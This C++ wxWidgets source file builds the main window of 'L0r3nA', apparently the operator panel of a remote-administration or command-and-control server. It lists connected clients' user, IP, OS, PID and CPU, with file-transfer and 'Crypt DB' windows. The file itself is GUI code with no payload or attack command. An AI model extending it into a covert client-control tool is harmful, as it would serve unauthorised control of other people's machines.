#include "frame_client.hpp"
#include "frame_crypt_db.hpp"
#include "frame_main.hpp"
#include "server.hpp"
#include "headers.hpp"

extern Servidor* p_Servidor;

class TransferFrame : public wxFrame {
    public:
        TransferFrame();
 
        void OnClose(wxCloseEvent& event);
    private:
        wxDECLARE_EVENT_TABLE();
};

wxBEGIN_EVENT_TABLE(TransferFrame, wxFrame)
    EVT_CLOSE(TransferFrame::OnClose)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyFrame, wxFrame)
    EVT_BUTTON(EnumIDS::ID_LimpiarLog, MyFrame::OnLimpiar)
    EVT_TOGGLEBUTTON(EnumIDS::ID_Toggle, MyFrame::OnToggle)
    EVT_BUTTON(EnumIDS::ID_Mostrar_CryptDB, MyFrame::OnCryptDB)
    EVT_BUTTON(EnumIDS::ID_Mostrar_Transfers, MyFrame::OnMostrarTransferencias)
    EVT_CLOSE(MyFrame::OnClose)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyListCtrl, wxListCtrl)
    EVT_CONTEXT_MENU(MyListCtrl::OnContextMenu)
    EVT_MENU(EnumIDS::ID_Interactuar, MyListCtrl::OnInteractuar)
    EVT_MENU(EnumIDS::ID_Refrescar, MyListCtrl::OnRefrescar)
    EVT_LIST_ITEM_ACTIVATED(EnumIDS::ID_Main_List, MyListCtrl::OnActivated)
wxEND_EVENT_TABLE()

class MyApp : public wxApp {
public:
    MyFrame* frame = nullptr;
    bool OnInit() override;
};

wxIMPLEMENT_APP(MyApp);

bool MyApp::OnInit(){
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
    this->frame = new MyFrame();
    this->frame->Show(true);

    return true;
}

MyFrame::MyFrame()
    : wxFrame(nullptr, EnumIDS::ID_MAIN, "L0r3nA")
{
    //Trace memory leak
    //_CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);
    //_CrtSetBreakAlloc(73502);
    //_CrtSetBreakAlloc(71043);
    //_CrtSetBreakAlloc(71042);
    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo con transparencia
    SetTransparent(245);
    p_Servidor = new Servidor();
    p_Servidor->m_listCtrl = nullptr;

    
    this->m_RPanel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(700, 450));
    
    this->m_LPanel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(110, 600));
    this->m_LPanel->SetBackgroundColour(wxColor(255,0,0)); // REMOVE AT THE END

    this->m_BPanel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(100, 150));
    this->m_BPanel->SetBackgroundColour(wxColor(0,255,0)); // REMOVE AT THE END

    
    //Crear lista
    this->CrearLista(wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES | wxEXPAND);
    wxBoxSizer *sizerlist = new wxBoxSizer(wxHORIZONTAL);

    sizerlist->Add(p_Servidor->m_listCtrl, 1, wxALL | wxEXPAND, 1);

    this->m_RPanel->SetSizer(sizerlist);

    
    //Crear controles panel izquierdo
    this->CrearControlesPanelIzquierdo();

    //Crear txt para log
    p_Servidor->m_txtLog->p_txtCtrl = new wxTextCtrl(this->m_BPanel, wxID_ANY, ":v\n", wxDefaultPosition, wxSize(100,150), wxTE_MULTILINE | wxTE_READONLY);
    wxBoxSizer *sizertxt = new wxBoxSizer(wxVERTICAL);

 
    sizertxt->Add(new wxButton(this->m_BPanel, EnumIDS::ID_LimpiarLog, "Limpiar Log", wxDefaultPosition, wxSize(100, 20)), 0, wxALL, 1);
    sizertxt->Add(p_Servidor->m_txtLog->p_txtCtrl, 1, wxALL | wxEXPAND, 1);
    this->m_BPanel->SetSizer(sizertxt);

    wxBoxSizer *sizer = new wxBoxSizer(wxHORIZONTAL);
    sizer->Add(this->m_LPanel, 0, wxALL, 2);

    wxBoxSizer *sizer2 = new wxBoxSizer(wxVERTICAL);
    sizer2->Add(this->m_RPanel, 1, wxEXPAND | wxALL, 2);
    sizer2->Add(this->m_BPanel, 0, wxEXPAND | wxALL, 2);

    sizer->Add(sizer2, 1, wxALL, 1);

    this->SetSizerAndFit(sizer);

    SetClientSize(900,600);
    SetSizeHints(920, 635, 920, 635);
    
    CreateStatusBar();
    SetStatusText("IDLE");
}

TransferFrame::TransferFrame() 
    :wxFrame(nullptr, EnumIDS::ID_Panel_Transferencias, wxT("Transferencias"), wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH, 450))
{
    wxListCtrl* listView = new wxListCtrl(this, EnumIDS::ID_Panel_Transferencias_List, wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH, 450), wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES | wxEXPAND);

    wxListItem itemCol;
    itemCol.SetText("Cliente");
    itemCol.SetWidth(100);
    itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
    listView->InsertColumn(0, itemCol);

    itemCol.SetText("Nombre");
    itemCol.SetWidth(160);
    listView->InsertColumn(1, itemCol);

    itemCol.SetText("Estado");
    itemCol.SetWidth(120);
    listView->InsertColumn(2, itemCol);

    itemCol.SetText("Progreso");
    itemCol.SetWidth(140);
    listView->InsertColumn(3, itemCol);
}

void TransferFrame::OnClose(wxCloseEvent& event){
    std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
    p_Servidor->p_Transferencias = false;
    lock.unlock();
    Sleep(500);
    if (p_Servidor->thTransfers.joinable()) {
        p_Servidor->thTransfers.join();
    }
    event.Skip();
}

void MyFrame::OnCryptDB(wxCommandEvent& event) {
    //OnCryptDB
    frameCryptDB* frame_crypt = new frameCryptDB();

    frame_crypt->Show();
}

void MyFrame::OnMostrarTransferencias(wxCommandEvent& event){
    
    p_Servidor->p_Transferencias = true;

    p_Servidor->thTransfers = std::thread(&Servidor::m_MonitorTransferencias, p_Servidor);
    
    //Crear form y mostrar
    TransferFrame* wxTransfers = new TransferFrame();
    wxTransfers->Show();
}

void MyFrame::OnToggle(wxCommandEvent& event) {

    bool isSel = this->btn_toggle->GetValue();
    if (isSel) {
        //Iniciar escucha
        
        if (p_Servidor->m_Iniciar()) {
            p_Servidor->m_Handler();
            this->btn_toggle->SetLabelText("Detener Servidor");
            SetStatusText("Esperando clientes...");
        }else {
            std::string strTmp = "Error escuchando ";
            strTmp.append(std::to_string(GetLastError()));
            p_Servidor->m_txtLog->LogThis(strTmp, LogType::LogError);
            SetStatusText("Error");
        }
        
    }else {
        //Detener escuchar
        p_Servidor->m_StopHandler();
        p_Servidor->m_CerrarConexiones();
        p_Servidor->m_JoinThreads();

        
        std::cout <<"VECTOR SIZE: "<< p_Servidor->vc_Clientes.size() << std::endl;

        p_Servidor->m_listCtrl->DeleteAllItems();
        SetStatusText("IDLE");
        this->btn_toggle->SetLabelText("Iniciar Servidor");
    }
    Sleep(500);
}

void MyFrame::CrearControlesPanelIzquierdo(){
    wxSize btn_size;
    this->btn_toggle = new wxToggleButton(this->m_LPanel, EnumIDS::ID_Toggle, "Iniciar Servidor");

    btn_size = this->btn_toggle->GetSize();

    this->btn_Transfers = new wxButton(this->m_LPanel, EnumIDS::ID_Mostrar_Transfers, "Transferencias", wxDefaultPosition, btn_size);
    this->btn_CryptDB = new wxButton(this->m_LPanel, EnumIDS::ID_Mostrar_CryptDB, "Crypt DB", wxDefaultPosition, btn_size);
    
    wxBoxSizer *m_paneSizer = new wxBoxSizer(wxVERTICAL);
    m_paneSizer->AddSpacer(20);    
    m_paneSizer->Add(this->btn_toggle, 0, wxALIGN_CENTER | wxALL, 3);
    m_paneSizer->AddSpacer(10);
    m_paneSizer->Add(this->btn_Transfers, 0, wxALIGN_CENTER | wxALL, 3);
    m_paneSizer->AddSpacer(10);
    m_paneSizer->Add(this->btn_CryptDB, 0, wxALIGN_CENTER | wxALL, 3);
    
    this->m_LPanel->SetSizerAndFit(m_paneSizer);

}

void MyFrame::CrearLista(long flags, bool withText){
    p_Servidor->m_listCtrl = new MyListCtrl(this->m_RPanel, EnumIDS::ID_Main_List, wxDefaultPosition, wxSize(600, 300), flags | wxBORDER_THEME);
   
    wxListItem itemCol;
    itemCol.SetText("ID");
    itemCol.SetWidth(100);
    itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
    p_Servidor->m_listCtrl->InsertColumn(0, itemCol);

    itemCol.SetText("USUARIO");
    itemCol.SetWidth(160);
    p_Servidor->m_listCtrl->InsertColumn(1, itemCol);

    itemCol.SetText("IP");
    itemCol.SetWidth(120);
    p_Servidor->m_listCtrl->InsertColumn(2, itemCol);

    itemCol.SetText("SO");
    itemCol.SetWidth(140);
    p_Servidor->m_listCtrl->InsertColumn(3, itemCol);

    itemCol.SetText("PID");
    itemCol.SetWidth(60);
    p_Servidor->m_listCtrl->InsertColumn(4, itemCol);

    itemCol.SetText("CPU");
    itemCol.SetWidth(200);
    p_Servidor->m_listCtrl->InsertColumn(5, itemCol);
}

void MyFrame::OnClose(wxCloseEvent& event){
    wxMessageDialog dialog(this, "Seguro que quieres salir?", "Salir", wxCENTER | wxYES_NO | wxICON_QUESTION);

    switch (dialog.ShowModal()) {
    case wxID_NO:
        event.Veto();
        return;
    case wxID_YES:
        break;
    }  
    
    std::unique_lock<std::mutex> lock(p_Servidor->p_mutex);
    p_Servidor->p_Escuchando = false;
    lock.unlock();
    
    p_Servidor->m_CerrarConexiones();
    p_Servidor->m_JoinThreads();

    Sleep(4000);
    
    delete p_Servidor;
    p_Servidor = nullptr;
    
    event.Skip();
}

void MyFrame::OnExit(wxCommandEvent& event) {
    Close(true);
}

void MyFrame::OnLimpiar(wxCommandEvent& event) {
    p_Servidor->m_txtLog->p_txtCtrl->Clear();
}

void MyFrame::OnAbout(wxCommandEvent& event){
    wxMessageBox(wxT("L0r3na v0.1"), wxT("About"));
}